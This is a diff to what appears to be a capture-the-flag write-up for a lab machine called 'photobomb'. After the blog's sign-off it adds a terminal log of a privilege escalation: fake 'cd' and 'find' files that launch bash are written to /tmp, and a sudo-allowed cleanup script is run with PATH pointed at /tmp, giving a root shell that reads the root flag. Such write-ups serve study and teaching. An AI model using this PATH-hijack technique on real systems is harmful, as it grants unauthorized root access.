@@ -64,3 +64,15 @@ From the result we only see one port open. Also, we note nmap was not redirected
 #### Execute:
 
 ********* And that was fun!!. Thank you for taking time to read my blog ************
+
+wizard@photobomb:~$ echo "/bin/bash" > /tmp/cd
+echo "/bin/bash" > /tmp/cd
+wizard@photobomb:~$ echo "/bin/bash" > /tmp/find
+echo "/bin/bash" > /tmp/find
+wizard@photobomb:~$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
+sudo PATH=/tmp:$PATH /opt/cleanup.sh
+root@photobomb:/home/wizard/photobomb# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@photobomb:/home/wizard/photobomb# cat /root/root.txt
+cat /root/root.txt
